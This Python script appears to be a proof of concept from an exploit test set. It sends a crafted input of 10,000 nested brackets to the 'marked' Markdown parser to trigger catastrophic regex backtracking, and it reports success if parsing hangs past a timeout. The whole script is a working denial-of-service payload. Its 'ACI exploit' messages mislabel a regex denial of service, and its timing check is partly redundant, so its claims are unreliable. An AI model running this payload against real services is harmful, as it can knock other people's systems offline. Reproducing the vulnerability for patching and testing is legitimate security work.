import time
import subprocess

# This is a crafted input that is known to cause issues in versions of marked affected by the ReDoS vulnerability.
# The input consists of a large number of nested square brackets, which can cause excessive backtracking in vulnerable regex implementations.
payload = "[a" + "][" * 10000 + "b" + "]" * 10000

start_time = time.time()
try:
    # Attempt to parse the payload using the marked parser.
    # We use a timeout to prevent the script from hanging indefinitely in case the vulnerability is present.
    result = subprocess.run(['npx', 'marked', payload], timeout=10, capture_output=True, text=True)
    elapsed_time = time.time() - start_time
    if elapsed_time < 10:
        print("The ACI exploit failed!!!")
    else:
        print("The ACI exploit success!!!")
except subprocess.TimeoutExpired:
    print("The ACI exploit success!!!")
